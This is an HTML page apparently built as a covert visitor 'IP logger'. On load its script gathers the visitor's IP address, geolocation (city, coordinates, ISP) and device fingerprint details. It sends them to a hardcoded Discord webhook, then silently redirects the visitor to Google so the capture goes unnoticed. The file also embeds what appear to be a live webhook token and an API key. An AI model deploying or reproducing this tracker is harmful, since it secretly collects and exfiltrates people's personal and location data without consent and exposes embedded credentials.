<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Visitor Info Logger</title>
</head>
<body>
    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
        const redirectURL = 'https://www.google.com';
        const ipflareAPIKey = 'd1e499e1d5842e97.b83b5e9e9e0197ab0a66eb4df3c8b707a05ab80b9f8d27598627804ad8478f27';

        // Function to get the user's IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return null;
            }
        }

        // Function to get location data using IP Flare
        async function getLocationData(ip) {
            try {
                const response = await fetch(`https://api.ipflare.io/${ip}`, {
                    method: 'GET',
                    headers: {
                        'X-API-Key': ipflareAPIKey
                    }
                });
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('Error fetching location data:', error);
                return null;
            }
        }

        // Function to collect device information
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
            const windowWidth = window.innerWidth;
            const windowHeight = window.innerHeight;
            const deviceMemory = navigator.deviceMemory || 'N/A';
            const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';

            return `
                User-Agent: ${userAgent}
                Platform: ${platform}
                Language: ${language}
                Timezone: ${timezone}
                Mobile Device: ${isMobile}
                Screen Resolution: ${screenResolution}
                Screen Orientation: ${screenOrientation}
                Window Dimensions: ${windowWidth}x${windowHeight}
                Device Memory: ${deviceMemory} GB
                Hardware Concurrency: ${hardwareConcurrency}
            `;
        }

        // Function to send data to the Discord webhook
        async function sendToDiscord() {
            const ip = await getIPAddress();
            let locationDetails = 'Unable to fetch location data';
            if (ip) {
                const locationData = await getLocationData(ip);
                if (locationData && !locationData.error) {
                    locationDetails = `
                        IP: ${locationData.ip}
                        Country: ${locationData.country_name}
                        Region: ${locationData.region}
                        City: ${locationData.city}
                        Latitude: ${locationData.latitude}
                        Longitude: ${locationData.longitude}
                        ISP: ${locationData.isp}
                        Timezone: ${locationData.timezone}
                    `;
                }
            }

            const deviceInfo = getDeviceInfo();
            const timestamp = new Date().toLocaleString();

            const payload = {
                embeds: [{
                    title: "New Visitor Information",
                    color: 7506394,
                    fields: [
                        { name: "Device Info", value: `\`\`\`${deviceInfo}\`\`\``, inline: false },
                        { name: "Location Info", value: `\`\`\`${locationDetails}\`\`\``, inline: false },
                    ],
                    footer: { text: `Logged at ${timestamp}` }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                if (response.ok) {
                    console.log('Visitor info logged successfully');
                    window.location.href = redirectURL;
                } else {
                    console.error('Failed to log visitor info:', response.statusText);
                }
            }).catch(error => console.error('Error sending to webhook:', error));
        }

        // Execute functions
        sendToDiscord();
    </script>
</body>
</html>
